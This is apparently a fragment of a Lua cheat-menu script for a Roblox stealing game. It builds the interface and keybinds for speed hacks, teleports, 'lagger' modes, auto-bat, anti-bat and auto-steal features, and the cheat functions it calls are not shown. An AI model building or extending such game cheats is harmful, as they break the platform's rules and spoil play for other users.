local tb = Instance.new("TextBox", parent); tb.Size = UDim2.new(0, w or 54, 0, 26); tb.Position = UDim2.new(1, -(xOff or 64), 0.5, -13); tb.BackgroundColor3 = Color3.fromRGB(6,14,38); tb.BackgroundTransparency = 0; tb.BorderSizePixel = 0; tb.Text = tostring(default); tb.TextColor3 = COLORS.white; tb.Font = Enum.Font.GothamBold; tb.TextSize = 12; tb.ClearTextOnFocus = false; tb.ZIndex = 5; corner(tb, 8); local bs = stroke(tb, COLORS.stroke, 1, 0.78) tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color = COLORS.accent}):Play() end) tb.FocusLost:Connect(function()
TS:Create(bs, TweenInfo.new(0.12), {Color = COLORS.strokeSoft}):Play() if cb then local n = tonumber(tb.Text); if n then cb(n) else tb.Text = tostring(default) end end end) return tb end
local function mkStepBox(parent, default, minValue, maxValue, cb)
    local current = math.clamp(tonumber(default) or minValue, minValue, maxValue)
    local function makeStepButton(text, xOffset)
        local button = Instance.new("TextButton", parent)
        button.Size = UDim2.new(0, 24, 0, 24)
        button.Position = UDim2.new(1, xOffset, 0.5, -12)
        button.BackgroundColor3 = S.themeColor or COLORS.accent
        button.BackgroundTransparency = 0.55
        button.BorderSizePixel = 0
        button.Text = text
        button.TextColor3 = COLORS.white
        button.Font = Enum.Font.GothamBold
        button.TextSize = 16
        button.ZIndex = 6
        button:SetAttribute("ThemeButton", true)
        corner(button, 7)
        stroke(button, S.themeColor or COLORS.stroke, 1, 0.55)
        return button
    end
    local minusButton = makeStepButton("-", -116)
    local valueBox = mkBox(parent, current, 54, 86, nil)
    local plusButton = makeStepButton("+", -28)
    local function setValue(value)
        current = math.clamp(math.floor((tonumber(value) or current) * 10 + 0.5) / 10, minValue, maxValue)
        valueBox.Text = tostring(current)
        if cb then cb(current) end
    end
    minusButton.Activated:Connect(function() setValue(current - 1); F.saveConfig() end)
    plusButton.Activated:Connect(function() setValue(current + 1); F.saveConfig() end)
    valueBox.FocusLost:Connect(function()
        local value = tonumber(valueBox.Text)
        if value then setValue(value) else valueBox.Text = tostring(current) end
        F.saveConfig()
    end)
    return valueBox, setValue
end
local GAMEPAD_KEYS = { [Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true, [Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true, [Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,
[Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true } local function isGamepadInput(inp) return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil end local function isBindableInput(inp) if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end if inp.UserInputType == Enum.UserInputType.Keyboard then return true end return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true end local function kbMatch(entry, kc) return kc and (kc == entry.kb or (entry.gp and kc == entry.gp)) end
local function mkKB(parent, kbEntry, cb) local btn = Instance.new("TextButton", parent); btn.Size = UDim2.new(0, 52, 0, 24); btn.Position = UDim2.new(1, -60, 0.5, -12); btn.BackgroundColor3 = S.themeColor or COLORS.accent or Color3.fromRGB(6,14,38); btn.BackgroundTransparency = 0.55; btn.BorderSizePixel = 0; btn:SetAttribute("ThemeButton", true) local function getLabel() return (kbEntry.gp and kbEntry.gp.Name) or (kbEntry.kb and kbEntry.kb.Name) or "None" end
btn.Text = getLabel(); btn.TextColor3 = COLORS.white; btn.Font = Enum.Font.GothamBold; btn.TextSize = 10; btn.ZIndex = 5; corner(btn, 8) stroke(btn, S.themeColor or COLORS.stroke, 1, 0.55); local li, lc, pv, listenStart = false, nil, btn.Text, 0 btn.Activated:Connect(function() if li then li = false; S._anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; btn.TextColor3 = COLORS.white; return end pv = btn.Text; li = true; S._anyKeyListening = true; listenStart = tick(); btn.Text = "..."; btn.TextColor3 = COLORS.accent lc = UIS.InputBegan:Connect(function(inp)
if not li then return end if inp.KeyCode == Enum.KeyCode.Escape then li = false; S._anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; btn.TextColor3 = COLORS.white; return end local isGp = isGamepadInput(inp) if isGp and tick() - listenStart < 0.15 then return end if not isBindableInput(inp) then return end btn.Text = inp.KeyCode.Name; pv = inp.KeyCode.Name; btn.TextColor3 = COLORS.white; li = false; S._anyKeyListening = false; if lc then lc:Disconnect(); lc = nil end if cb then cb(inp.KeyCode, isGp) end end) end) return btn end
local function mkToggleKB(parent, txt, kbEntry, onToggle, onKB) local row = mkRow(parent, 34); mkLabel(row, txt) if kbEntry then mkKB(row, kbEntry, function(k, isGp) if isGp then kbEntry.gp = k; kbEntry.kb = nil else kbEntry.kb = k; kbEntry.gp = nil end if onKB then onKB(k, isGp) end end) end local pill, dot; do local __m = {mkPill(row, kbEntry and 118 or 52)}; pill = __m[1]; dot = __m[2]; end; local on = false local function sv(s) on = s; animPill(pill, dot, s) end local clk = Instance.new("TextButton", pill); clk.Size = UDim2.new(1, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 6 clk.Activated:Connect(function()
if S._anyKeyListening then return end on = not on; sv(on); if onToggle then onToggle(on) end end) return sv end lo = 0; section(pageMOVE, "Auto Speed") do S.setAutoCarrySpeedVisual = mkToggle(pageMOVE, "Speed", function(on) S.autoCarrySpeedEnabled = on if not on then pcall(F.disableAutoCarrySpeed) end F.saveConfig() end) end section(pageMOVE, "Speed") do local row = mkRow(pageMOVE, 34); mkLabel(row, "Normal Speed"); UI.normalBox = mkStepBox(row, NS, 1, 500, function(v) NS = v; S.NS = v end) end
do local row = mkRow(pageMOVE, 34); mkLabel(row, "Carry Speed"); UI.carryBox = mkStepBox(row, CS, 1, 500, function(v) CS = v; S.CS = v end) end
do local row = mkRow(pageMOVE, 34); mkLabel(row, "Lagger Normal"); UI.laggerBox = mkStepBox(row, S.LAGGER_SPEED, 1, 500, function(v) S.LAGGER_SPEED = v end) end
do local row = mkRow(pageMOVE, 34); mkLabel(row, "Lagger Carry"); UI.laggerCarryBox = mkStepBox(row, S.LAGGER_CARRY_SPEED, 1, 500, function(v) S.LAGGER_CARRY_SPEED = v end) end
do local row = mkRow(pageMOVE, 34); mkLabel(row, "Mode"); modeValLbl = Instance.new("TextLabel", row); modeValLbl.Size = UDim2.new(0, 100, 1, 0); modeValLbl.Position = UDim2.new(1, -110, 0, 0); modeValLbl.BackgroundTransparency = 1; modeValLbl.Text = "Normal"; modeValLbl.TextColor3 = COLORS.accentStrong; modeValLbl.Font = Enum.Font.GothamBlack; modeValLbl.TextSize = 12; modeValLbl.TextXAlignment = Enum.TextXAlignment.Right; local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(1, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 2
clk.Activated:Connect(function() if S._anyKeyListening then return end F.toggleCarryMode(); F.saveConfig() end) end section(pageMOVE, "Auto Play") do local sv = mkToggleKB(pageMOVE, "Auto Left", KB.AutoLeft, function(on) S.autoLeftEnabled = on if on then F.queueAutoLeftStart() else F.stopAutoLeft() end end, function(k, isGp) if isGp then KB.AutoLeft.gp = k; KB.AutoLeft.kb = nil else KB.AutoLeft.kb = k; KB.AutoLeft.gp = nil end; F.saveConfig() end) S.autoLeftSetVisual = sv end do local sv = mkToggleKB(pageMOVE, "Auto Right", KB.AutoRight, function(on) S.autoRightEnabled = on
if on then F.queueAutoRightStart() else F.stopAutoRight() end end, function(k, isGp) if isGp then KB.AutoRight.gp = k; KB.AutoRight.kb = nil else KB.AutoRight.kb = k; KB.AutoRight.gp = nil end; F.saveConfig() end) S.autoRightSetVisual = sv end section(pageMOVE, "Teleport") do local row = mkRow(pageMOVE, 34); mkLabel(row, "Drop Brainrot") mkKB(row, KB.DropBrainrot, function(k, isGp) if isGp then KB.DropBrainrot.gp = k; KB.DropBrainrot.kb = nil else KB.DropBrainrot.kb = k; KB.DropBrainrot.gp = nil end; F.saveConfig() end)
local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(0.55, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 2 clk.Activated:Connect(function() F.runDrop() end) end do local row = mkRow(pageMOVE, 34); mkLabel(row, "TP Down") mkKB(row, KB.TPFloor, function(k, isGp) if isGp then KB.TPFloor.gp = k; KB.TPFloor.kb = nil else KB.TPFloor.kb = k; KB.TPFloor.gp = nil end; F.saveConfig() end) local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(0.55, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 2
clk.Activated:Connect(function() F.runTPFloor() end) end do VS.setAutoTPVisual = mkToggle(pageMOVE, "Auto TP", function(on) S.autoTPEnabled = on if on then F.startAutoTP() else F.stopAutoTP() end F.saveConfig() end) end do local row = mkRow(pageMOVE, 34); mkLabel(row, "Auto TP Height") UI.autoTPHeightBox = mkBox(row, S.autoTPHeight, 54, 62, function(v) if v >= 0 and v <= 500 then S.autoTPHeight = v elseif UI.autoTPHeightBox then UI.autoTPHeightBox.Text = tostring(S.autoTPHeight) end F.saveConfig() end) end lo = 0; section(pageTOOLS, "Bat")
-- Anti-TP Bat settings removed.

do
local abRow = mkRow(pageTOOLS, 34); mkLabel(abRow, "Auto Bat") mkKB(abRow, KB.AutoBat, function(k, isGp) if isGp then KB.AutoBat.gp = k; KB.AutoBat.kb = nil else KB.AutoBat.kb = k; KB.AutoBat.gp = nil end F.saveConfig() end) local abPill, abDot; do local __m = {mkPill(abRow, 118)}; abPill = __m[1]; abDot = __m[2]; end local abOn = false local function svAutoBat(s) abOn = s; animPill(abPill, abDot, s) end S.autoBatSetVisual = svAutoBat; local abClk = Instance.new("TextButton", abPill); abClk.Size = UDim2.new(1, 0, 1, 0); abClk.BackgroundTransparency = 1; abClk.Text = ""; abClk.ZIndex = 6 abClk.Activated:Connect(function()
if S._anyKeyListening then return end abOn = not abOn; svAutoBat(abOn) if abOn then F.queueAutoBatStart() else S.autoBatEnabled = false; S.disableAutoBat() end F.saveConfig() end) end do local row = mkRow(pageTOOLS, 34); mkLabel(row, "Auto Bat Speed"); UI.autoBatSpeedBox = mkStepBox(row, S.AUTO_BAT_SPEED or 58, 1, 500, function(v) S.AUTO_BAT_SPEED = v end) end VS.setBatV2Visual = mkToggleKB(pageTOOLS, "Bat V2", KB.BatV2, function(on) if on then F.startBatV2() else F.stopBatV2() end F.saveConfig() end, function(k, isGp) if isGp then KB.BatV2.gp = k; KB.BatV2.kb = nil else KB.BatV2.kb = k; KB.BatV2.gp = nil end F.saveConfig() end) VS.setMirrorTPVisual = mkToggle(pageTOOLS, "Mirror TP Down", function(on) F.setMirrorTPDown(on) F.saveConfig() end) do
VS.setAutoSwingVisual = mkToggle(pageTOOLS, "Auto Swing", function(on) S.autoSwingEnabled = on F.saveConfig() end)
VS.setBatCounterVisual = mkToggle(pageTOOLS, "Bat Counter", function(on) S.batCounterEnabled = on if on then S.startBatCounter() else S.stopBatCounter() end F.saveConfig() end) end do
local expanded = false; local speedExpanded = false
local headerH = 34
local baseBodyH = 108
local speedExtraH = 46
local bodyH = baseBodyH

local wrap = Instance.new("Frame", pageTOOLS); wrap.Size = UDim2.new(1, 0, 0, headerH); wrap.BackgroundTransparency = 1; wrap.ClipsDescendants = true; wrap.LayoutOrder = LO()
local header = Instance.new("Frame", wrap); header.Size = UDim2.new(1, 0, 0, headerH); header.BackgroundColor3 = COLORS.row; header.BorderSizePixel = 0; corner(header, 9); stroke(header, COLORS.strokeSoft, 1, 0.55)
header.MouseEnter:Connect(function() TS:Create(header, TweenInfo.new(0.1), {BackgroundColor3 = COLORS.row2}):Play() end)
header.MouseLeave:Connect(function() TS:Create(header, TweenInfo.new(0.1), {BackgroundColor3 = COLORS.row}):Play() end)

local arrow = Instance.new("TextLabel", header)
arrow.Size = UDim2.new(0, 22, 1, 0); arrow.Position = UDim2.new(0, 8, 0, 0); arrow.BackgroundTransparency = 1; arrow.Text = "▶"; arrow.TextColor3 = COLORS.accentStrong; arrow.Font = Enum.Font.GothamBold; arrow.TextSize = 11; arrow.TextXAlignment = Enum.TextXAlignment.Left

local titleLbl = Instance.new("TextLabel", header); titleLbl.Size = UDim2.new(0.5, 0, 1, 0); titleLbl.Position = UDim2.new(0, 28, 0, 0); titleLbl.BackgroundTransparency = 1; titleLbl.Text = "TP Bat"; titleLbl.TextColor3 = COLORS.white; titleLbl.Font = Enum.Font.GothamBold; titleLbl.TextSize = 12; titleLbl.TextXAlignment = Enum.TextXAlignment.Left

local modeHint = Instance.new("TextLabel", header); modeHint.Size = UDim2.new(0, 68, 0, 18); modeHint.Position = UDim2.new(1, -130, 0.5, -9); modeHint.BackgroundColor3 = Color3.fromRGB(6,14,38); modeHint.Text = (tpBatMode == 2) and "V2 Manual" or "V1 Auto"; modeHint.Visible = true; modeHint.TextColor3 = COLORS.accentStrong; modeHint.Font = Enum.Font.GothamBold; modeHint.TextSize = 10; modeHint.BorderSizePixel = 0; corner(modeHint, 5)

local pill, dot; do local __m = {mkPill(header, 52)}; pill = __m[1]; dot = __m[2]; end; local tpOn = false
local function svTP(s) tpOn = s; animPill(pill, dot, s) end
VS.setTPBatVisual = svTP

local pillClk = Instance.new("TextButton", pill); pillClk.Size = UDim2.new(1, 0, 1, 0); pillClk.BackgroundTransparency = 1; pillClk.Text = ""; pillClk.ZIndex = 6
pillClk.Activated:Connect(function() if S._anyKeyListening then return end tpOn = not tpOn; svTP(tpOn); setTPBatState(tpOn); F.saveConfig() end)

local body = Instance.new("Frame", wrap)
body.Size = UDim2.new(1, 0, 0, bodyH); body.Position = UDim2.new(0, 0, 0, headerH); body.BackgroundTransparency = 1; body.Visible = false

local function updateWrapHeight()
    bodyH = baseBodyH + (speedExpanded and speedExtraH or 0)
    body.Size = UDim2.new(1, 0, 0, bodyH)
    if expanded then
        TS:Create(wrap, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { Size = UDim2.new(1, 0, 0, headerH + bodyH + 2) }):Play()
    else
        TS:Create(wrap, TweenInfo.new(0.18, Enum.EasingStyle.Quad), { Size = UDim2.new(1, 0, 0, headerH) }):Play()
    end
end

local function setExpanded(on)
    expanded = on
    arrow.Text = on and "▼" or "▶"
    body.Visible = on
    updateWrapHeight()
end

local expandBtn = Instance.new("TextButton", header); expandBtn.Size = UDim2.new(1, -56, 1, 0); expandBtn.Position = UDim2.new(0, 0, 0, 0); expandBtn.BackgroundTransparency = 1; expandBtn.Text = ""; expandBtn.ZIndex = 2
expandBtn.Activated:Connect(function() if S._anyKeyListening then return end setExpanded(not expanded) end)

-- ROW 1: Keybind
local kbRow = Instance.new("Frame", body); kbRow.Size = UDim2.new(1, 0, 0, 32); kbRow.Position = UDim2.new(0, 0, 0, 4); kbRow.BackgroundColor3 = COLORS.row2; kbRow.BorderSizePixel = 0; corner(kbRow, 8); stroke(kbRow, COLORS.strokeSoft, 1, 0.6)
local kbLbl = Instance.new("TextLabel", kbRow); kbLbl.Size = UDim2.new(0.5, 0, 1, 0); kbLbl.Position = UDim2.new(0, 12, 0, 0); kbLbl.BackgroundTransparency = 1; kbLbl.Text = "Keybind"; kbLbl.TextColor3 = COLORS.textDim; kbLbl.Font = Enum.Font.GothamBold; kbLbl.TextSize = 11; kbLbl.TextXAlignment = Enum.TextXAlignment.Left
mkKB(kbRow, KB.TPBat, function(k, isGp) if isGp then KB.TPBat.gp = k; KB.TPBat.kb = nil; TP_BAT_CONTROLLER = k else KB.TPBat.kb = k; KB.TPBat.gp = nil; TP_BAT_KEY = k end F.saveConfig() end)

-- ROW 2: Mode V1 / V2 selector
local modeRow = Instance.new("Frame", body); modeRow.Size = UDim2.new(1, 0, 0, 32); modeRow.Position = UDim2.new(0, 0, 0, 38); modeRow.BackgroundColor3 = COLORS.row2; modeRow.BorderSizePixel = 0; corner(modeRow, 8); stroke(modeRow, COLORS.strokeSoft, 1, 0.6)
local modeTitle = Instance.new("TextLabel", modeRow); modeTitle.Size = UDim2.new(0.35, 0, 1, 0); modeTitle.Position = UDim2.new(0, 12, 0, 0); modeTitle.BackgroundTransparency = 1; modeTitle.Text = "Mode (MVP)"; modeTitle.TextColor3 = COLORS.textDim; modeTitle.Font = Enum.Font.GothamBold; modeTitle.TextSize = 11; modeTitle.TextXAlignment = Enum.TextXAlignment.Left

local v1Btn = Instance.new("TextButton", modeRow); v1Btn.Size = UDim2.new(0, 68, 0, 22); v1Btn.Position = UDim2.new(1, -156, 0.5, -11); v1Btn.BorderSizePixel = 0; v1Btn.Text = "V1 Auto"; v1Btn.Font = Enum.Font.GothamBold; v1Btn.TextSize = 10; v1Btn.ZIndex = 6; corner(v1Btn, 6); stroke(v1Btn, COLORS.stroke, 1, 0.55)
local v2Btn = Instance.new("TextButton", modeRow); v2Btn.Size = UDim2.new(0, 78, 0, 22); v2Btn.Position = UDim2.new(1, -84, 0.5, -11); v2Btn.BorderSizePixel = 0; v2Btn.Text = "V2 Manual"; v2Btn.Font = Enum.Font.GothamBold; v2Btn.TextSize = 10; v2Btn.ZIndex = 6; corner(v2Btn, 6); stroke(v2Btn, COLORS.stroke, 1, 0.55)

local function refreshModeButtons()
    local isV1 = (tpBatMode == 1)
    v1Btn.BackgroundColor3 = isV1 and (COLORS.accent or Color3.fromRGB(40, 55, 40)) or Color3.fromRGB(6,14,38)
    v1Btn.TextColor3 = isV1 and COLORS.white or COLORS.textDim
    v2Btn.BackgroundColor3 = (not isV1) and (COLORS.accent or Color3.fromRGB(40, 55, 40)) or Color3.fromRGB(6,14,38)
    v2Btn.TextColor3 = (not isV1) and COLORS.white or COLORS.textDim
    if modeHint then modeHint.Text = isV1 and "V1 Auto" or "V2 Manual" end
end
refreshModeButtons()

v1Btn.MouseButton1Click:Connect(function()
    tpBatMode = 1
    refreshModeButtons()
    if tpBatEnabled then stopTPBat(); startTPBat() end
    F.saveConfig()
end)

v2Btn.MouseButton1Click:Connect(function()
    tpBatMode = 2
    refreshModeButtons()
    if tpBatEnabled then stopTPBat(); startTPBat() end
    F.saveConfig()
end)

-- ROW 3: Speed Seletor com Seta de expansão à esquerda
local speedRow = Instance.new("Frame", body); speedRow.Size = UDim2.new(1, 0, 0, 32); speedRow.Position = UDim2.new(0, 0, 0, 72); speedRow.BackgroundColor3 = COLORS.row2; speedRow.BorderSizePixel = 0; corner(speedRow, 8); stroke(speedRow, COLORS.strokeSoft, 1, 0.6)

-- Seta apontando pra baixo (ou lado quando fechada) do lado esquerdo do seletor
local speedArrowBtn = Instance.new("TextButton", speedRow)
speedArrowBtn.Size = UDim2.new(0, 24, 1, 0); speedArrowBtn.Position = UDim2.new(0, 6, 0, 0); speedArrowBtn.BackgroundTransparency = 1; speedArrowBtn.Text = "▼"; speedArrowBtn.TextColor3 = COLORS.accentStrong; speedArrowBtn.Font = Enum.Font.GothamBold; speedArrowBtn.TextSize = 11; speedArrowBtn.ZIndex = 6

local speedHeaderLbl = Instance.new("TextLabel", speedRow)
speedHeaderLbl.Size = UDim2.new(0.5, 0, 1, 0); speedHeaderLbl.Position = UDim2.new(0, 30, 0, 0); speedHeaderLbl.BackgroundTransparency = 1; speedHeaderLbl.Text = "Speed: " .. tostring(S.tpBatSpeed or 40); speedHeaderLbl.TextColor3 = COLORS.white; speedHeaderLbl.Font = Enum.Font.GothamBold; speedHeaderLbl.TextSize = 11; speedHeaderLbl.TextXAlignment = Enum.TextXAlignment.Left

local speedRowClk = Instance.new("TextButton", speedRow)
speedRowClk.Size = UDim2.new(1, 0, 1, 0); speedRowClk.BackgroundTransparency = 1; speedRowClk.Text = ""; speedRowClk.ZIndex = 4

-- Sub-painel expansível de Speed (com +, -, valor, e texto "quanto mais rápido mais preciso que nem o mvp")
local speedPanel = Instance.new("Frame", body)
speedPanel.Size = UDim2.new(1, 0, 0, 42); speedPanel.Position = UDim2.new(0, 0, 0, 106); speedPanel.BackgroundColor3 = Color3.fromRGB(16, 16, 18); speedPanel.BorderSizePixel = 0; corner(speedPanel, 8); stroke(speedPanel, COLORS.strokeSoft, 1, 0.4); speedPanel.Visible = false

local speedLeftContainer = Instance.new("Frame", speedPanel)
speedLeftContainer.Size = UDim2.new(0.58, 0, 1, 0); speedLeftContainer.Position = UDim2.new(0, 10, 0, 0); speedLeftContainer.BackgroundTransparency = 1

local speedTitleLbl = Instance.new("TextLabel", speedLeftContainer)
speedTitleLbl.Size = UDim2.new(1, 0, 0, 18); speedTitleLbl.Position = UDim2.new(0, 0, 0, 3); speedTitleLbl.BackgroundTransparency = 1
speedTitleLbl.Text = "Speed:"
speedTitleLbl.TextColor3 = COLORS.white
speedTitleLbl.Font = Enum.Font.GothamBold
speedTitleLbl.TextSize = 11
speedTitleLbl.TextXAlignment = Enum.TextXAlignment.Left

local speedHintLbl = Instance.new("TextLabel", speedLeftContainer)
speedHintLbl.Size = UDim2.new(1, 0, 0, 16); speedHintLbl.Position = UDim2.new(0, 0, 0, 21); speedHintLbl.BackgroundTransparency = 1
speedHintLbl.Text = "quanto mais rápido mais preciso"
speedHintLbl.TextColor3 = Color3.fromRGB(160, 160, 170)
speedHintLbl.Font = Enum.Font.Gotham
speedHintLbl.TextSize = 9
speedHintLbl.TextXAlignment = Enum.TextXAlignment.Left

-- Controles: [-], [Valor], [+]
local spdMinusBtn = Instance.new("TextButton", speedPanel)
spdMinusBtn.Size = UDim2.new(0, 26, 0, 24); spdMinusBtn.Position = UDim2.new(1, -112, 0.5, -12); spdMinusBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 28); spdMinusBtn.BorderSizePixel = 0; spdMinusBtn.Text = "−"; spdMinusBtn.TextColor3 = COLORS.white; spdMinusBtn.Font = Enum.Font.GothamBold; spdMinusBtn.TextSize = 14; spdMinusBtn.ZIndex = 6; corner(spdMinusBtn, 6); stroke(spdMinusBtn, COLORS.stroke, 1, 0.5)

local spdValLbl = Instance.new("TextLabel", speedPanel)
spdValLbl.Size = UDim2.new(0, 40, 0, 24); spdValLbl.Position = UDim2.new(1, -82, 0.5, -12); spdValLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); spdValLbl.BorderSizePixel = 0; spdValLbl.Text = tostring(S.tpBatSpeed or 40); spdValLbl.TextColor3 = COLORS.accentStrong or COLORS.white; spdValLbl.Font = Enum.Font.GothamBold; spdValLbl.TextSize = 11; corner(spdValLbl, 6); stroke(spdValLbl, COLORS.stroke, 1, 0.4)

local spdPlusBtn = Instance.new("TextButton", speedPanel)
spdPlusBtn.Size = UDim2.new(0, 26, 0, 24); spdPlusBtn.Position = UDim2.new(1, -38, 0.5, -12); spdPlusBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 28); spdPlusBtn.BorderSizePixel = 0; spdPlusBtn.Text = "+"; spdPlusBtn.TextColor3 = COLORS.white; spdPlusBtn.Font = Enum.Font.GothamBold; spdPlusBtn.TextSize = 14; spdPlusBtn.ZIndex = 6; corner(spdPlusBtn, 6); stroke(spdPlusBtn, COLORS.stroke, 1, 0.5)

local function updateSpeedUI(val)
    val = math.clamp(math.floor(tonumber(val) or 40), 10, 80)
    S.tpBatSpeed = val
    spdValLbl.Text = tostring(val)
    speedHeaderLbl.Text = "Speed: " .. tostring(val)
    F.saveConfig()
end

spdMinusBtn.MouseButton1Click:Connect(function()
    updateSpeedUI((S.tpBatSpeed or 40) - 5)
end)

spdPlusBtn.MouseButton1Click:Connect(function()
    updateSpeedUI((S.tpBatSpeed or 40) + 5)
end)

local function toggleSpeedExpand()
    speedExpanded = not speedExpanded
    speedArrowBtn.Text = speedExpanded and "▼" or "▶"
    speedPanel.Visible = speedExpanded
    updateWrapHeight()
end

speedArrowBtn.MouseButton1Click:Connect(toggleSpeedExpand)
speedRowClk.MouseButton1Click:Connect(toggleSpeedExpand)
end
section(pageTOOLS, "Duels OP")
VS.setDuelsAntiDropVisual = mkToggle(pageTOOLS, "Anti Drop", function(on)
if on then F.startDuelsAntiDrop() else F.stopDuelsAntiDrop() end
F.saveConfig()
end)
VS.setMysteryAntiBatVisual = mkToggle(pageTOOLS, "Anti Bat", function(on)
F.setMysteryAntiBat(on)
F.saveConfig()
end)
section(pageTOOLS, "Steal") do
local stealBarScaleRow = mkRow(pageTOOLS, 34); mkLabel(stealBarScaleRow, "Steal Bar Size")
local stealBarScaleMinus = Instance.new("TextButton", stealBarScaleRow); stealBarScaleMinus.Size = UDim2.new(0, 28, 0, 24); stealBarScaleMinus.Position = UDim2.new(1, -112, 0.5, -12); stealBarScaleMinus.BackgroundColor3 = Color3.fromRGB(6,14,38); stealBarScaleMinus.BorderSizePixel = 0; stealBarScaleMinus.Text = "−"; stealBarScaleMinus.TextColor3 = COLORS.white; stealBarScaleMinus.Font = Enum.Font.GothamBold; stealBarScaleMinus.TextSize = 16; stealBarScaleMinus.ZIndex = 5; corner(stealBarScaleMinus, 8)
local stealBarScaleValue = Instance.new("TextLabel", stealBarScaleRow); stealBarScaleValue.Size = UDim2.new(0, 44, 0, 24); stealBarScaleValue.Position = UDim2.new(1, -80, 0.5, -12); stealBarScaleValue.BackgroundColor3 = Color3.fromRGB(6,14,38); stealBarScaleValue.BorderSizePixel = 0; stealBarScaleValue.Text = tostring(S.progressBarScale or 100) .. "%"; stealBarScaleValue.TextColor3 = COLORS.white; stealBarScaleValue.Font = Enum.Font.GothamBold; stealBarScaleValue.TextSize = 11; stealBarScaleValue.ZIndex = 5; corner(stealBarScaleValue, 8); UI.stealBarScaleLbl = stealBarScaleValue
local stealBarScalePlus = Instance.new("TextButton", stealBarScaleRow); stealBarScalePlus.Size = UDim2.new(0, 28, 0, 24); stealBarScalePlus.Position = UDim2.new(1, -32, 0.5, -12); stealBarScalePlus.BackgroundColor3 = Color3.fromRGB(6,14,38); stealBarScalePlus.BorderSizePixel = 0; stealBarScalePlus.Text = "+"; stealBarScalePlus.TextColor3 = COLORS.white; stealBarScalePlus.Font = Enum.Font.GothamBold; stealBarScalePlus.TextSize = 16; stealBarScalePlus.ZIndex = 5; corner(stealBarScalePlus, 8)
local function bumpStealBarScale(delta) if S._anyKeyListening then return end; local n = math.clamp((tonumber(S.progressBarScale) or 100) + delta, 50, 200); if _G._VersincApplyProgressBarScale then _G._VersincApplyProgressBarScale(n) end; stealBarScaleValue.Text = tostring(S.progressBarScale or n) .. "%"; F.saveConfig() end
stealBarScaleMinus.Activated:Connect(function() bumpStealBarScale(-10) end); stealBarScalePlus.Activated:Connect(function() bumpStealBarScale(10) end)
local stealRow=mkRow(pageTOOLS,34); mkLabel(stealRow,"Auto Steal"); local pill, dot; do local __m = {mkPill(stealRow,52)}; pill = __m[1]; dot = __m[2]; end
local function applyStealVis(on) TS:Create(pill,TweenInfo.new(0.15),{BackgroundColor3=on and COLORS.accent or COLORS.off}):Play(); TS:Create(dot,TweenInfo.new(0.15),{Position=on and UDim2.new(1,-22,0.5,-8) or UDim2.new(0,2,0.5,-8),BackgroundColor3=on and COLORS.white or COLORS.textDim}):Play() end
VS.setInstaGrab=applyStealVis
pill.InputBegan:Connect(function(inp) if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end if S._anyKeyListening then return end local on=not autoStealEnabled; if on then startAutoSteal() else stopAutoSteal() end; applyStealVis(on); F.saveConfig() end)
end do
VS.setRagdollStealVisual=mkToggle(pageTOOLS,"Ragdoll Grab",function(on)
S.ragdollStealEnabled=on==true
if not S.ragdollStealEnabled then RagdollGrab.clear() end
F.saveConfig()
end)
local row=mkRow(pageTOOLS,34); mkLabel(row,"Steal Mode"); local modeLbl=Instance.new("TextButton",row); modeLbl.Size=UDim2.new(0,90,0,24); modeLbl.Position=UDim2.new(1,-100,0.5,-12); modeLbl.BackgroundColor3=Color3.fromRGB(18,18,20); modeLbl.BorderSizePixel=0; modeLbl.Text=selectedStealMode; modeLbl.TextColor3=COLORS.white; modeLbl.Font=Enum.Font.GothamBold; modeLbl.TextSize=11; modeLbl.ZIndex=5; corner(modeLbl,8); UI.stealModeLbl=modeLbl
modeLbl.MouseButton1Click:Connect(function() selectedStealMode=(selectedStealMode=="Normal") and "Semi" or "Normal"; MysteryGrab.setMode(selectedStealMode); modeLbl.Text=selectedStealMode; F.saveConfig() end)
end
do local row=mkRow(pageTOOLS,34); mkLabel(row,"Steal Radius"); UI.radInput=mkBox(row,Steal.StealRadius,54,62,function(v) v=tonumber(v); if v and v>0 then autoStealRadius=v; Steal.StealRadius=v; AceStealRadii[selectedStealMode]=v; if progressRadLbl then progressRadLbl.Text=string.format("Radius: %.0f",v) end; F.saveConfig() end end) end
do local row=mkRow(pageTOOLS,34); mkLabel(row,"Steal Duration"); UI.stealDurInput=mkBox(row,Steal.StealDuration,54,62,function(v) v=tonumber(v); if v and v>=0.1 then Steal.StealDuration=v; F.saveConfig() end end) end
